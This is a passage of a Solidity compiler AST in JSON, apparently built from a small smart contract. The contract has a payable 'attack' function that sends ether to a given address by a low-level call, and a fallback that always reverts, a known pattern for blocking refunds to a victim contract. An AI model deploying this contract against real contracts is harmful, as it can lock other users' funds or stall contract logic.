																	"src": "200:4:0",
																	"typeDescriptions": {
																		"typeIdentifier": "t_address_payable",
																		"typeString": "address payable"
																	}
																},
																"id": 13,
																"isConstant": false,
																"isLValue": false,
																"isPure": false,
																"lValueRequested": false,
																"memberName": "call",
																"nodeType": "MemberAccess",
																"referencedDeclaration": null,
																"src": "200:9:0",
																"typeDescriptions": {
																	"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$",
																	"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
																}
															},
															"id": 14,
															"isConstant": false,
															"isLValue": false,
															"isPure": false,
															"lValueRequested": false,
															"memberName": "value",
															"nodeType": "MemberAccess",
															"referencedDeclaration": null,
															"src": "200:15:0",
															"typeDescriptions": {
																"typeIdentifier": "t_function_setvalue_pure$_t_uint256_$returns$_t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value_$",
																"typeString": "function (uint256) pure returns (function (bytes memory) payable returns (bool,bytes memory))"
															}
														},
														"id": 17,
														"isConstant": false,
														"isLValue": false,
														"isPure": false,
														"kind": "functionCall",
														"lValueRequested": false,
														"names": [],
														"nodeType": "FunctionCall",
														"src": "200:26:0",
														"tryCall": false,
														"typeDescriptions": {
															"typeIdentifier": "t_function_barecall_payable$_t_bytes_memory_ptr_$returns$_t_bool_$_t_bytes_memory_ptr_$value",
															"typeString": "function (bytes memory) payable returns (bool,bytes memory)"
														}
													},
													"id": 19,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "200:30:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$_t_bool_$_t_bytes_memory_ptr_$",
														"typeString": "tuple(bool,bytes memory)"
													}
												},
												"id": 20,
												"nodeType": "ExpressionStatement",
												"src": "200:30:0"
											}
										]
									},
									"documentation": null,
									"functionSelector": "d018db3e",
									"id": 22,
									"implemented": true,
									"kind": "function",
									"modifiers": [],
									"name": "attack",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 8,
										"nodeType": "ParameterList",
										"parameters": [
											{
												"constant": false,
												"id": 7,
												"mutability": "mutable",
												"name": "addr",
												"nodeType": "VariableDeclaration",
												"overrides": null,
												"scope": 22,
												"src": "153:20:0",
												"stateVariable": false,
												"storageLocation": "default",
												"typeDescriptions": {
													"typeIdentifier": "t_address_payable",
													"typeString": "address payable"
												},
												"typeName": {
													"id": 6,
													"name": "address",
													"nodeType": "ElementaryTypeName",
													"src": "153:15:0",
													"stateMutability": "payable",
													"typeDescriptions": {
														"typeIdentifier": "t_address_payable",
														"typeString": "address payable"
													}
												},
												"value": null,
												"visibility": "internal"
											}
										],
										"src": "152:22:0"
									},
									"returnParameters": {
										"id": 9,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "189:0:0"
									},
									"scope": 30,
									"src": "137:101:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "public"
								},
								{
									"body": {
										"id": 28,
										"nodeType": "Block",
										"src": "277:27:0",
										"statements": [
											{
												"expression": {
													"argumentTypes": null,
													"arguments": [],
													"expression": {
														"argumentTypes": [],
														"id": 25,
														"name": "revert",
														"nodeType": "Identifier",
														"overloadedDeclarations": [
															-19,
															-19
														],
														"referencedDeclaration": -19,
														"src": "288:6:0",
														"typeDescriptions": {
															"typeIdentifier": "t_function_revert_pure$__$returns$__$",
															"typeString": "function () pure"
														}
													},
													"id": 26,
													"isConstant": false,
													"isLValue": false,
													"isPure": false,
													"kind": "functionCall",
													"lValueRequested": false,
													"names": [],
													"nodeType": "FunctionCall",
													"src": "288:8:0",
													"tryCall": false,
													"typeDescriptions": {
														"typeIdentifier": "t_tuple$__$",
														"typeString": "tuple()"
													}
												},
												"id": 27,
												"nodeType": "ExpressionStatement",
												"src": "288:8:0"
											}
										]
									},
									"documentation": null,
									"id": 29,
									"implemented": true,
									"kind": "fallback",
									"modifiers": [],
									"name": "",
									"nodeType": "FunctionDefinition",
									"overrides": null,
									"parameters": {
										"id": 23,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "258:2:0"
									},
									"returnParameters": {
										"id": 24,
										"nodeType": "ParameterList",
										"parameters": [],
										"src": "277:0:0"
									},
									"scope": 30,
									"src": "250:54:0",
									"stateMutability": "payable",
									"virtual": false,
									"visibility": "external"
								}
							],
							"scope": 31,
							"src": "60:249:0"
						}
					],
					"src": "33:277:0"
				},
				"id": 0
			}
		}
	}
}